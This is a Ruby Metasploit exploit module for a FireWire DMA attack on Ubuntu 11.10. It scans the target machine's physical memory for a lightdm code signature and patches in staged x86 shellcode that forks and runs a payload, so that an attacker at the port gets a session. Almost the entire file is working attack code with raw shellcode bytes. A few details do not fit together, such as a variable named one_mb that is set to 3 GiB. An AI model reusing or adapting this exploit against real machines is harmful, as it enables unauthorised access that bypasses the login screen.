require 'msf/core'
require '~/.msf4/external/forensic1394/bus.rb'

class Metasploit3 < Msf::Exploit::Local
    # Rank = ExcellentRanking

	def initialize(info = {})
		super(update_info(info,
            # TODO: fix before deployment
			'Name'           => 'farm <= 11.10 Firewire DMA attack to overwrite lightdm code',
			'Description'    => %q{
                Firewire lightdm attack.
          	},
			'Author'         => [ 'albert', 'Mr.Breaker' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 0.12 $',
			'References'     =>
				[
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 296,
                    'Encoder'     => 'generic/none'
				},
			'Platform'       => 'linux',
			'Arch'           => ARCH_X86,
			'Targets'	=>
				[
					[ 'Ubuntu 11.10', { 'Offset' => 0x590, 'Signature' =>
                       # "\x74\x1e\x89\x5c\x24\x04\xc7\x04\x24\x70\x73\x05\x08\xe8\x3e\x53\xff\xff\x83\xc4\x24\x31\xc0\x5b\x5e", 'Space' => 75 } ],
                        "\x74\x1e\x89\x5c\x24\x04\xc7\x04\x24", 'Space' => 75 } ],
					# [ 'Ubuntu 11.10', { 'Offset' => 0x4f2, 'Signature' => "8B430C8B501C895424048B40", 'Space' => 75 } ],
				],
			'DefaultTarget'	=> 0,
        	'DisclosureDate' => 'Long long ago', 
        ))
        register_options(
			[
			], self.class)

		register_advanced_options(
			[
			], self.class)
	end

	def exploit
        stagerpatch = "\xe8\x00\x00\x00\x00\x60\x31\xc0" +
                      "\xb0\xc0\x31\xdb\x31\xc9\xb5\x10" +
                      "\x99\xb2\x07\xbe\x22\x00\x00\x00" +
                      "\xcd\x80\x66\xc7\x00\xff\xe0\xff\xe0" 
        #forkpatch = "\x50\xb8\x02\x00\x00\x00\xcd\x80\x85\xc0\x74\x02\x58\xc3"
        #prologue= "\x90\x90\x89\x5c\x24\x04\xc7\x04\x24\x70\x73\x05\x08\xe8\x3e\x53\xff\xff\x83\xc4\x24\x31\xc0\x5b\x5e"
        # sig = hex2bin(target['Signature'])
        sig = target['Signature']
        # nops = nop_generator.generate_sled(target['Space'] - payload.encoded.length) 
        #patch = forkpatch + payload.encoded
        off = target['Offset'] 

        # Print phase, method and patch parameters
        puts '        Using signature: %s' % bin2hex(sig)
        puts '        Using patch:     %s' % bin2hex(stagerpatch)
        puts '        Using offset:    %x' % off

        # Initialize
        b = Bus.new
        d = initialize_fw(b)
         
        ##
        # Stage 1 of the attack
        ##

        # Attack
        puts 'Starting attack...'

        patchPage(d,sig,stagerpatch,off)

        ##
        # Stage 2 of the attack
        ##
        page = "\x31\xc0\x40\x40\xcd\x80\x85\xc0" +
               "\x75\x0c\x61\x83\x2c\x24\x05\x83" +
               "\xc4\x04\xff\x64\x24\xfc"
        stagesig = "\xff\xe0"  
        patch = page + payload.encoded

        # Wait for user input
        puts 'Press enter if patch on target is run'
        gets

        puts 'Searching for payload page'
        patchPage(d, stagesig,patch, 0)

        ##
        # Stage 3
        ##
		print_status "Starting the payload handler..."
		while(true)
			break if session_created?
			select(nil,nil,nil,1)
		end

        b.delete
 	end

    def initialize_fw(b)
        # Enable SBP-2 support to ensure we get DMA
        b.enable_sbp2()

        begin
            for i in 2.downto(1)
                puts "[+] Initializing bus and enabling SBP2, please wait %2d seconds or press Ctrl+C \r" % i
                STDOUT.flush
                sleep(1)
            end
        rescue 
            puts 'Interrupted'
        end 

        # Open the first device
        d = b.devices
        raise 'nothing connected' if d.length <= 0

        d = d[0]
        d.open()
        puts ''

        return d
    end 

    # Tries to find signature on a page at offset at device d 
    def patchPage(d,sig,patch,off)

        # Find memory size
        memsize = 4 * 1024 * 1024  * 1024

        begin        
            addr = findsig(d, sig, off, memsize)
            fail('Signature not found.') if !addr

            puts 'Signature found at 0x%x.' % addr
            d.write(addr, patch)
            puts 'Patch NOT confirmed!' if d.read(addr, patch.length) != patch

        rescue IOError => e
            fail( e.message + ' Make sure FireWire interfaces are properly connected.' )
        end
    end


    def findsig(d, sig, off, memsize)
        pagesize = 4096 
        # Skip the first 1 MiB of memory
        one_mb = 3 * 1024 * 1024 * 1024
        
        for addr in (one_mb + off..memsize).step(pagesize)
            return addr if sig == d.read(addr, sig.length)
        end
    end          

    def fail(msg)
        puts "\n [!] Attack unsuccessful. " + msg
        exit
    end

    def hex2bin(s)
        raise "Not a valid hex string" unless(s =~ /^[\da-fA-F]+$/)
        s = '0' + s if((s.length & 1) != 0)
        return s.scan(/../).map{ |b| b.to_i(16) }.pack('C*')
    end

    def bin2hex(s)
        return s.unpack('C*').map{ |b| "%02X" % b }.join('')
    end
end
